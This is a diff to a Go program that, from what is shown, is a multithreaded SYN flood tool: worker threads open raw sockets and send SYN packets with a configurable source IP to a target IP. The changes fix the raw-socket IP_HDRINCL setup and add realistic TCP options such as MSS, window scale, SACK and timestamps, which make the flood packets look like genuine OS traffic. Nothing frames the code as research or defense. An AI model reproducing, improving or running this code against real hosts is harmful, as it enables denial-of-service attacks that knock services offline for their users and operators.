@@ -11,6 +11,7 @@ import (
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
+	"golang.org/x/sys/unix"
 )
 
 type Config struct {
@@ -84,11 +85,16 @@ func (c *Config) worker(id int, stopChan chan struct{}) {
 		log.Printf("Thread %d: Failed to get raw connection: %v", id, err)
 		return
 	}
-
+	var setsockErr error
 	// Enable IP_HDRINCL for raw IP packet crafting
 	rawConn.Control(func(fd uintptr) {
 		// This allows us to include IP header
+		setsockErr = unix.SetsockoptInt(int(fd), unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
 	})
+	if setsockErr != nil {
+		log.Printf("Thread %d: Failed to set IP_HDRINCL: %v", id, setsockErr)
+		return
+	}
 
 	packetCount := 0
 	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
@@ -114,10 +120,23 @@ func (c *Config) sendSynPacket(conn net.PacketConn, rng *rand.Rand) error {
 	// Create IP layer
 	ipLayer := &layers.IPv4{
 		Version:  4,
+		IHL:      5,
 		TTL:      64,
 		Protocol: layers.IPProtocolTCP,
 		SrcIP:    c.srcIP,
 		DstIP:    c.targetIP,
+	}
+
+	tsVal := uint32(time.Now().UnixNano() / 1e6) // ms
+	tcpOpts := []layers.TCPOption{
+		{OptionType: layers.TCPOptionKindMSS, OptionLength: 4, OptionData: []byte{0x05, 0xB4}}, // MSS 1460
+		{OptionType: layers.TCPOptionKindNop},                                                  // pad for alignment
+		{OptionType: layers.TCPOptionKindWindowScale, OptionLength: 3, OptionData: []byte{7}},  // WS=7
+		{OptionType: layers.TCPOptionKindSACKPermitted, OptionLength: 2},                       // SACKOK
+		{OptionType: layers.TCPOptionKindTimestamps, OptionLength: 10, OptionData: []byte{
+			byte(tsVal >> 24), byte(tsVal >> 16), byte(tsVal >> 8), byte(tsVal),
+			0, 0, 0, 0, // TSecr=0 for initial SYN
+		}},
 	}
 
 	// Create TCP layer with SYN flag
@@ -127,6 +146,7 @@ func (c *Config) sendSynPacket(conn net.PacketConn, rng *rand.Rand) error {
 		Seq:     rng.Uint32(),
 		Window:  65535,
 		SYN:     true,
+		Options: tcpOpts,
 	}
 
 	// Calculate TCP checksum
